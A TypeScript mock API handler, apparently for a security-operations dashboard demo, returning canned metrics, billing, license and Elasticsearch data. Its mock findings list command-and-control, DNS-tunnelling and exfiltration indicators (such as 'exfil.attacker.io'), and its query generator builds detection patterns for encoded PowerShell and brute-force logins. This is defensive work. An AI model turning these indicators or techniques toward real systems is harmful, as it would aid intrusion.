    D.alerts.forEach((a: any) => { const t = a.mitre_tactic || 'Unknown'; tacticCounts[t] = (tacticCounts[t] || 0) + 1; });
    return ok({
      mttr_hours: 0, mttd_hours: 7.7, sla_compliance_rate: 87.4,
      open_cases:      D.cases.filter((c: any) => c.status !== 'closed').length,
      critical_cases:  D.cases.filter((c: any) => c.severity === 'critical' && c.status !== 'closed').length,
      total_assets:    D.assets.length,
      critical_assets: D.assets.filter((a: any) => a.criticality === 'critical').length,
      online_agents:   D.agents.filter((a: any) => a.status === 'online').length,
      total_alerts:    D.alerts.length,
      alert_volume:    days30,
      risk_trend:      days30.map((d, i) => ({ date: d.date, count: Math.floor(seededRand(i * 13) * 80 + 30) })),
      cases_by_severity: [
        { label: 'critical', count: D.cases.filter((c: any) => c.severity === 'critical').length },
        { label: 'high',     count: D.cases.filter((c: any) => c.severity === 'high').length },
        { label: 'medium',   count: D.cases.filter((c: any) => c.severity === 'medium').length },
        { label: 'sla_breach', count: 2 },
      ],
      cases_by_phase: [
        { label: 'open',          count: D.cases.filter((c: any) => c.status === 'open').length },
        { label: 'investigating', count: D.cases.filter((c: any) => c.status === 'investigating').length },
        { label: 'closed',        count: D.cases.filter((c: any) => c.status === 'closed').length },
      ],
      top_mitre_tactics: Object.entries(tacticCounts).sort((a, b) => b[1] - a[1]).slice(0, 6).map(([label, count]) => ({ label, count })),
    });
  }
  if (p === '/soc/metrics') {
    const now = Date.now();
    return ok({
      total_open:       D.alerts.filter((a: any) => a.status === 'open').length,
      total_acked:      D.alerts.filter((a: any) => a.status === 'acknowledged').length,
      total_resolved:   D.alerts.filter((a: any) => a.status === 'resolved').length,
      avg_mttr_minutes: 0,
      alerts_by_day:    Array.from({ length: 14 }, (_, i) => ({ date: new Date(now - (13 - i) * 86400000).toISOString().slice(0, 10), count: Math.floor(seededRand(i * 9) * 20 + 5) })),
      backlog_trend:    Array.from({ length: 14 }, (_, i) => ({ date: new Date(now - (13 - i) * 86400000).toISOString().slice(0, 10), count: Math.floor(seededRand(i * 17) * 10 + 2) })),
      analysts:         [],
    });
  }

  // ── Live log stream ───────────────────────────────────────────────────────
  if (p === '/live-logs' || p === '/logs/live') return ok(LIVE_LOG_LINES);

  // ── DPI ───────────────────────────────────────────────────────────────────
  if (p === '/dpi/findings') {
    const DPI_FINDINGS = [
      { id: 1, agent_id: D.agents[0]?.id ?? 1, finding_type: 'dga',                 severity: 'high',     score: 87, indicator: 'xn--krpn3c.biz',       description: 'Domain matches DGA pattern (entropy 4.8, WHOIS age < 7d)', mitre_technique: 'T1568.002', raw_context: { entropy: 4.8, length: 14, tld: 'biz' }, alert_fired: true,  detected_at: new Date(Date.now() - 1800000).toISOString() },
      { id: 2, agent_id: D.agents[0]?.id ?? 1, finding_type: 'tls_anomaly',         severity: 'critical', score: 94, indicator: '185.220.101.47:443',    description: 'TLS certificate issued to known C2 infrastructure; JA3 matches Cobalt Strike', mitre_technique: 'T1071.001', raw_context: { ja3: 'a0e9f5d64349fb13191bc781f81f42e1', issuer: 'Let\'s Encrypt' }, alert_fired: true,  detected_at: new Date(Date.now() - 3600000).toISOString() },
      { id: 3, agent_id: D.agents[1]?.id ?? 2, finding_type: 'dns_tunnel',          severity: 'high',     score: 81, indicator: 'data.c2tunnel.net',     description: 'High-entropy DNS TXT queries indicating DNS tunneling exfiltration', mitre_technique: 'T1071.004', raw_context: { query_rate: 48, avg_entropy: 5.2, record_type: 'TXT' }, alert_fired: true,  detected_at: new Date(Date.now() - 5400000).toISOString() },
      { id: 4, agent_id: D.agents[1]?.id ?? 2, finding_type: 'http_pattern',        severity: 'medium',   score: 63, indicator: '10.0.0.22:8080',        description: 'Beaconing pattern: HTTP POST every 60s to non-standard port, small fixed payload', mitre_technique: 'T1071.001', raw_context: { interval_seconds: 60, payload_size: 128, jitter_pct: 2 }, alert_fired: false, detected_at: new Date(Date.now() - 7200000).toISOString() },
      { id: 5, agent_id: D.agents[2]?.id ?? 3, finding_type: 'proto_on_wrong_port', severity: 'medium',   score: 57, indicator: '10.0.0.5:53',           description: 'HTTP traffic detected on port 53 — possible protocol disguise to evade firewall', mitre_technique: 'T1571',     raw_context: { expected_proto: 'DNS', detected_proto: 'HTTP', port: 53 }, alert_fired: false, detected_at: new Date(Date.now() - 10800000).toISOString() },
      { id: 6, agent_id: D.agents[0]?.id ?? 1, finding_type: 'icmp_tunnel',         severity: 'high',     score: 78, indicator: '203.0.113.42',          description: 'ICMP echo payload contains structured binary data consistent with tunneled traffic', mitre_technique: 'T1095',     raw_context: { payload_bytes: 1400, echo_rate_per_min: 22 }, alert_fired: true,  detected_at: new Date(Date.now() - 14400000).toISOString() },
      { id: 7, agent_id: D.agents[3]?.id ?? 4, finding_type: 'tls_anomaly',         severity: 'low',      score: 38, indicator: 'api.dropbox.com:443',   description: 'Unusual TLS version (1.0) negotiated — client may be legacy or spoofed', mitre_technique: 'T1040',     raw_context: { tls_version: 'TLSv1.0', cipher: 'RC4-SHA' }, alert_fired: false, detected_at: new Date(Date.now() - 18000000).toISOString() },
      { id: 8, agent_id: D.agents[1]?.id ?? 2, finding_type: 'http_connect_tunnel', severity: 'critical', score: 91, indicator: '185.220.101.47:22',     description: 'HTTP CONNECT tunnel established to SSH port — likely proxy-over-HTTP evasion', mitre_technique: 'T1572',     raw_context: { upstream_host: '185.220.101.47', upstream_port: 22, method: 'CONNECT' }, alert_fired: true,  detected_at: new Date(Date.now() - 21600000).toISOString() },
      { id: 9, agent_id: D.agents[0]?.id ?? 1, finding_type: 'smtp_non_standard',   severity: 'high',     score: 76, indicator: '10.0.0.15:2525',        description: 'SMTP traffic to non-standard port with large attachment — possible data exfiltration', mitre_technique: 'T1048.003', raw_context: { attachment_size_kb: 4096, recipient: 'external@gmail.com' }, alert_fired: true,  detected_at: new Date(Date.now() - 25200000).toISOString() },
      { id: 10, agent_id: D.agents[2]?.id ?? 3, finding_type: 'dns_tcp_tunnel',     severity: 'medium',   score: 61, indicator: 'exfil.attacker.io',     description: 'DNS-over-TCP with oversized query (> 512 bytes) — bypass of UDP-only DNS filters', mitre_technique: 'T1071.004', raw_context: { query_size: 892, record_type: 'NULL', ttl: 0 }, alert_fired: false, detected_at: new Date(Date.now() - 28800000).toISOString() },
    ];
    const typeF = sp.get('finding_type');
    const sevF  = sp.get('severity');
    const alertF = sp.get('alert_only');
    const offset = parseInt(sp.get('offset') || '0');
    const limit  = parseInt(sp.get('limit')  || '100');
    let arr = [...DPI_FINDINGS];
    if (typeF)  arr = arr.filter(f => f.finding_type === typeF);
    if (sevF)   arr = arr.filter(f => f.severity === sevF);
    if (alertF) arr = arr.filter(f => f.alert_fired);
    const slice = arr.slice(offset, offset + limit);
    return ok({ findings: slice, total: arr.length });
  }
  if (p === '/dpi/summary') {
    return ok({
      total_24h:   10,
      alerted_24h: 5,
      breakdown: [
        { finding_type: 'tls_anomaly',         severity: 'critical', count: 2 },
        { finding_type: 'dga',                 severity: 'high',     count: 2 },
        { finding_type: 'dns_tunnel',          severity: 'high',     count: 1 },
        { finding_type: 'http_connect_tunnel', severity: 'critical', count: 1 },
        { finding_type: 'smtp_non_standard',   severity: 'high',     count: 1 },
        { finding_type: 'http_pattern',        severity: 'medium',   count: 1 },
        { finding_type: 'proto_on_wrong_port', severity: 'medium',   count: 1 },
        { finding_type: 'icmp_tunnel',         severity: 'high',     count: 1 },
      ],
    });
  }

  // ── Billing (tenant self-service) ────────────────────────────────────────
  if (p === '/billing/plans') {
    return ok([
      { id: 1, name: 'trial',      display_name: 'Free Trial',  price_monthly: 0,   max_agents: 10,  max_users: 3,  features: {} },
      { id: 2, name: 'starter',    display_name: 'Starter',     price_monthly: 149, max_agents: 25,  max_users: 5,  features: {} },
      { id: 3, name: 'growth',     display_name: 'Growth',      price_monthly: 399, max_agents: 100, max_users: 15, features: {} },
      { id: 4, name: 'pro',        display_name: 'Pro',         price_monthly: 999, max_agents: 500, max_users: 50, features: {} },
      { id: 5, name: 'enterprise', display_name: 'Enterprise',  price_monthly: 0,   max_agents: -1,  max_users: -1, features: {} },
    ]);
  }

  if (p === '/billing/subscription') {
    return ok({
      subscription: {
        id: 1, tenant_id: 1, plan_id: 3,
        plan_name: 'growth', plan_display_name: 'Growth',
        price_monthly: 399, max_agents: 100, max_users: 15,
        features: { dpi: true, yara: true, pdf_reports: true, api_keys: true },
        status: 'active',
        trial_ends_at: null,
        current_period_start: new Date(Date.now() - 30 * 86400000).toISOString(),
        current_period_end: new Date(Date.now() + 30 * 86400000).toISOString(),
        created_at: new Date(Date.now() - 90 * 86400000).toISOString(),
        updated_at: new Date().toISOString(),
      },
      usage: { agent_count: 4, user_count: 2, ioc_count: 47 },
    });
  }

  if (p === '/billing/request-upgrade') return ok({ message: 'Request received (demo mode)' });

  // ── Platform capabilities (controls tab visibility) ──────────────────────
  if (p === '/platform/capabilities') return ok({ is_authority: true, license_mode: false, saas_mode: false });

  // ── SaaS Admin (platform admin) ───────────────────────────────────────────
  if (p === '/platform/saas/mode')          return ok({ saas_mode: false });
  if (p === '/platform/saas/stats')         return ok({ total_tenants: 3, active_tenants: 2, trial_tenants: 1, suspended_tenants: 0, mrr: 798 });
  if (p === '/platform/saas/plans')         return ok([]);
  if (p === '/platform/saas/subscriptions') return ok([]);

  // ── License Admin (platform admin) ───────────────────────────────────────
  if (p === '/platform/license/mode')  return ok({ license_mode: false });
  if (p === '/platform/license/keys')  return ok([]);
  if (p === '/license/check')          return ok({ enforcement: false, valid: false, message: 'Demo mode — enforcement not active.' });
  if (method === 'POST' && p === '/platform/license/mode')          return demoBlock();
  if (method === 'POST' && p === '/platform/license/keys')          return demoBlock();
  if (method === 'DELETE' && p.startsWith('/platform/license/keys/')) return demoBlock();
  if (method === 'POST' && p.includes('/platform/license/keys/') && p.endsWith('/regenerate')) return demoBlock();
  if (method === 'DELETE' && /^\/platform\/tenants\/\d+$/.test(p)) return demoBlock();

  // ── Per-tenant SMTP config ───────────────────────────────────────────────
  if (p === '/settings/smtp') {
    if (method === 'GET') return ok({ host: '', port: '587', username: '', from_addr: '', tls: true });
    if (method === 'PUT') return demoBlock();
  }

  // ── Elasticsearch proxy (demo) ────────────────────────────────────────────
  const DEMO_ES_INDICES = [
    { index:'xcloak-logs-2026.07', health:'green',  status:'open', docs_count:'48231',  store_size:'124mb',  pri:2, rep:1, creation_date:'2026-07-01T00:00:00Z' },
    { index:'xcloak-logs-2026.06', health:'green',  status:'open', docs_count:'312084', store_size:'891mb',  pri:2, rep:1, creation_date:'2026-06-01T00:00:00Z' },
    { index:'xcloak-logs-2026.05', health:'yellow', status:'open', docs_count:'287432', store_size:'763mb',  pri:2, rep:1, creation_date:'2026-05-01T00:00:00Z' },
    { index:'xcloak-alerts',       health:'green',  status:'open', docs_count:'1847',   store_size:'8.2mb',  pri:1, rep:1, creation_date:'2026-01-01T00:00:00Z' },
    { index:'xcloak-agents',       health:'green',  status:'open', docs_count:'12',     store_size:'128kb',  pri:1, rep:1, creation_date:'2026-01-01T00:00:00Z' },
    { index:'.kibana_1',           health:'yellow', status:'open', docs_count:'47',     store_size:'2.1mb',  pri:1, rep:1, creation_date:'2026-01-01T00:00:00Z' },
  ];
  const DEMO_ES_MAPPING = {
    properties: {
      id:           { type:'long' },
      agent_id:     { type:'long' },
      log_source:   { type:'keyword' },
      log_message:  { type:'text', analyzer:'standard' },
      collected_at: { type:'date', format:'strict_date_optional_time' },
      'parsed_fields.src_ip':      { type:'ip' },
      'parsed_fields.dst_ip':      { type:'ip' },
      'parsed_fields.user':        { type:'keyword' },
      'parsed_fields.process':     { type:'keyword' },
      'parsed_fields.event_id':    { type:'keyword' },
      'parsed_fields.auth_result': { type:'keyword' },
      'parsed_fields.hostname':    { type:'keyword' },
      'parsed_fields.port':        { type:'integer' },
      'parsed_fields.method':      { type:'keyword' },
      'parsed_fields.status_code': { type:'integer' },
      'parsed_fields.bytes':       { type:'long' },
      'parsed_fields.severity':    { type:'keyword' },
    },
  };

  if (p === '/elastic/health') return ok({
    status:'green', cluster_name:'xcloak-cluster', number_of_nodes:3,
    active_primary_shards:8, active_shards:16, unassigned_shards:2,
    relocating_shards:0, initializing_shards:0,
  });
  if (p === '/elastic/indices') return ok({ indices: DEMO_ES_INDICES });
  if (/^\/elastic\/mappings\//.test(p)) return ok({ mapping: DEMO_ES_MAPPING });

  if (p === '/elastic/query' && method === 'POST') {
    const q = JSON.parse(body || '{}');
    const size = Math.min(q.dsl?.size ?? 10, 200);
    const hits = DEMO_SEARCH_LOGS.slice(0, size).map((l: any) => {
      let pf: Record<string,any> = {};
      try { pf = JSON.parse(l.parsed_fields || '{}'); } catch {}
      return {
        _index: 'xcloak-logs-2026.07',
        _id: String(l.id),
        _score: parseFloat((Math.random() * 0.5 + 0.5).toFixed(3)),
        _source: { id:l.id, agent_id:l.agent_id, log_source:l.log_source, log_message:l.log_message, collected_at:l.collected_at, ...pf },
      };
    });
    const hasSrcAgg  = q.dsl?.aggs?.by_source     || q.dsl?.aggs?.by_source_ip || q.dsl?.aggs?.by_src;
    const hasHourAgg = q.dsl?.aggs?.over_time      || q.dsl?.aggs?.by_hour;
    const hasUserAgg = q.dsl?.aggs?.by_user;
    const srcBuckets: Record<string,number> = {};
    for (const l of DEMO_SEARCH_LOGS) { srcBuckets[l.log_source] = (srcBuckets[l.log_source]||0)+1; }
    const aggs = q.dsl?.aggs ? {
      ...(hasSrcAgg ? { [Object.keys(q.dsl.aggs)[0]]: { buckets: Object.entries(srcBuckets).map(([k,v])=>({ key:k, doc_count:v })).sort((a:any,b:any)=>b.doc_count-a.doc_count).slice(0,15) } } : {}),
      ...(hasHourAgg ? { over_time: { buckets: Array.from({length:24},(_,i)=>({ key_as_string:`2026-07-${String(14).padStart(2,'0')}T${String(23-i).padStart(2,'0')}:00:00Z`, key:Date.now()-(23-i)*3600000, doc_count:Math.floor(Math.random()*60+5) })) } } : {}),
      ...(hasUserAgg ? { by_user: { buckets:[{key:'root',doc_count:42},{key:'admin',doc_count:31},{key:'ubuntu',doc_count:18},{key:'ec2-user',doc_count:12}] } } : {}),
    } : undefined;
    return ok({
      took: Math.floor(Math.random()*30+5),
      timed_out: false,
      total: DEMO_SEARCH_LOGS.length,
      hits: { total:{ value:DEMO_SEARCH_LOGS.length, relation:'eq' }, hits },
      aggregations: q.dsl?.aggs ? aggs : undefined,
      _shards: { total:3, successful:3, skipped:0, failed:0 },
    });
  }

  if (p === '/elastic/explain' && method === 'POST') {
    return ok({
      parsed_query: { bool:{ must:[{ match:{ log_message:{ query:'failed', operator:'OR' } } }] } },
      execution_plan: 'BooleanWeight(+log_message:failed) → TermQuery → PostingsEnum',
      scoring: 'BM25(k1=1.2, b=0.75) — normalized TF-IDF per shard',
      analyzer: 'standard (lowercase → ascii-fold → stemmer)',
      optimizations: ['partial result caching','ConstantScoreWeight rewrite','skip-ahead with DISI conjunction'],
      cost_estimate: { docs_scanned:DEMO_SEARCH_LOGS.length, shards_queried:3, estimated_ms:8 },
    });
  }

  if (p === '/ai/es-query' && method === 'POST') {
    const q = JSON.parse(body || '{}');
    const prompt = (q.prompt || '').toLowerCase();
    let dsl: any;
    if (prompt.includes('fail') || prompt.includes('brute') || prompt.includes('auth')) {
      dsl = { query:{ bool:{ should:[{ match_phrase:{ log_message:'Failed password' } },{ match_phrase:{ log_message:'authentication failure' } },{ term:{ 'parsed_fields.event_id':'4625' } }], minimum_should_match:1, filter:[{ range:{ collected_at:{ gte:'now-24h' } } }] } }, aggs:{ by_ip:{ terms:{ field:'parsed_fields.src_ip', size:20 } }, by_user:{ terms:{ field:'parsed_fields.user', size:10 } } }, sort:[{ collected_at:{ order:'desc' } }], size:100 };
    } else if (prompt.includes('powershell') || prompt.includes('ps1') || prompt.includes('encoded')) {
      dsl = { query:{ bool:{ should:[{ match_phrase:{ log_message:'powershell.exe' } },{ match_phrase:{ log_message:'Invoke-Expression' } },{ match_phrase:{ log_message:'-EncodedCommand' } },{ term:{ 'parsed_fields.event_id':'4104' } }], minimum_should_match:1 } }, sort:[{ collected_at:{ order:'desc' } }], size:50 };
    } else if (prompt.includes('country') || prompt.includes('geo') || prompt.includes('two')) {
      dsl = { query:{ bool:{ must:[{ range:{ collected_at:{ gte:'now-7d' } } }] } }, aggs:{ by_user:{ terms:{ field:'parsed_fields.user', size:20 }, aggs:{ by_ip:{ terms:{ field:'parsed_fields.src_ip', size:10 } } } } }, size:0 };
    } else if (prompt.includes('dns') || prompt.includes('domain') || prompt.includes('dga')) {
      dsl = { query:{ bool:{ filter:[{ term:{ log_source:'named' } }], should:[{ match_phrase:{ log_message:'NXDOMAIN' } }], minimum_should_match:1 } }, aggs:{ top_domains:{ terms:{ field:'parsed_fields.query_name', size:30 } } }, sort:[{ collected_at:{ order:'desc' } }], size:50 };
    } else if (prompt.includes('c2') || prompt.includes('beacon') || prompt.includes('outbound')) {
      dsl = { query:{ bool:{ filter:[{ range:{ collected_at:{ gte:'now-6h' } } }], should:[{ match_phrase:{ log_message:'CONNECT' } },{ match_phrase:{ log_message:'outbound' } }], minimum_should_match:1 } }, aggs:{ by_dest:{ terms:{ field:'parsed_fields.dst_ip', size:20 }, aggs:{ over_time:{ date_histogram:{ field:'collected_at', fixed_interval:'5m' } } } } }, size:0 };
    } else {
      dsl = { query:{ match_all:{} }, sort:[{ collected_at:{ order:'desc' } }], size:20 };
    }
    return ok({ dsl, explanation:`Generated ES DSL for: "${q.prompt}"`, confidence:0.87 });
  }

  // ── Fallback ─────────────────────────────────────────────────────────────
  return ok([]);
}
